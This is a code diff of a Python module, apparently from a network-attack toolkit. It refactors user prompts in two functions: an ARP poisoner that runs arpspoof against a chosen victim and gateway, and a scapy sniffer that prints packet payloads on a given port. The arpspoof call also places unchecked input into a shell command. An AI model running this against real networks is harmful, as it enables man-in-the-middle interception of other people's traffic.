@@ -2,32 +2,30 @@ import socket
 socket.has_ipv6=False
 from scapy.all import *
 from scapy.layers.inet import TCP
-from helpers.utils import output
+from helpers.utils import *
 import os
+
 
 def arpoisoner(out_lck):
 
     output(out_lck, "Arp Poisoner")
 
-    output(out_lck, "Please insert interface's name: ")
-    intf = input()
+    intf = loop_input(out_lck, "Please insert interface's name: ")
 
-    output(out_lck, "Please insert victim IP (Ex 0.10x): ")
-    victimip = input()
+    victimip = loop_input(out_lck, "Please insert victim IP (Ex 0.10): ")
 
-    output(out_lck, "Please insert gateway IP: ")
-    gatewayip = input()
+    gatewayip = loop_input(out_lck, "Please insert gateway IP: ")
 
     os.system("xterm -e \"arpspoof -i %s -t %s %s\"" % (intf, victimip, gatewayip))
+
 
 def analyzer(out_lck):
 
     output(out_lck, "Analizer")
-    output(out_lck, "Please insert protocol: (Ex 'tcp' or 'udp')")
-    protocol = input()
 
-    output(out_lck, "Please insert port number: ")
-    port = input()
+    protocol = loop_input(out_lck, "Please insert protocol: (Ex 'tcp' or 'udp')")
+
+    port = loop_int_input(out_lck, "Please insert port number: ")
 
     a = sniff(filter="%s and port %s" % (protocol, port), prn=lambda x: x[TCP].payload)
 
